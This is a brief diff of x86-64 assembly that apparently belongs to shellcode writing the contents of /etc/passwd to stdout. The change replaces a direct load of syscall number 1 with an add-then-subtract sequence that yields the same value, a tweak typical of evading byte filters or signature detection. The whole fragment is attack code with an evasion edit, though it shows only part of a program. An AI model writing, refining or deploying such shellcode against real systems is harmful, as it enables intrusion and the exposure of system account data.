@@ -24,7 +24,9 @@ goback:
 
 	# write(/etc/passwd)
 	#xor	%rax, %rax
-	mov	$1, %al			# system call 1 is write
+	mov	$3, %al
+	sub	$2, %al
+	#mov	$1, %al			# system call 1 is write
 	mov	%rax, %rdi		# file handle 1 is stdout
 	mov	%rsp, %rsi
         xor	%rdx, %rdx
